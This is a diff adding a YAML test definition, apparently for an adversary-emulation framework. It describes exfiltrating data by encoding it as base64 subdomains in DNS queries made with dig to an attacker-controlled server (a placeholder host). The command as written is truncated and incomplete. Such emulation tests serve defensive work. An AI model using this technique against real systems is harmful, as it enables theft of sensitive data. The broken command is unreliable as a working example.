@@ -1,0 +1,21 @@
+---
+- id: 541a94764cf71032f81411931293baa6
+  name: Exfiltrate Data using DNS Queries via dig
+  description: "This test demonstrates how an attacker can exfiltrate sensitive information\
+    \ by encoding it as a subdomain (using base64 encoding) and \nmaking DNS queries\
+    \ via the dig command to a controlled DNS server.\n"
+  tactic: exfiltration
+  technique:
+    attack_id: T1048
+    name: Exfiltration Over Alternative Protocol
+  platforms:
+    darwin:
+      sh:
+        command: dig @#{attacker_dns_server} -p
+        payloads: []
+        cleanup: ''
+    linux:
+      sh:
+        command: dig @#{attacker_dns_server} -p
+        payloads: []
+        cleanup: ''
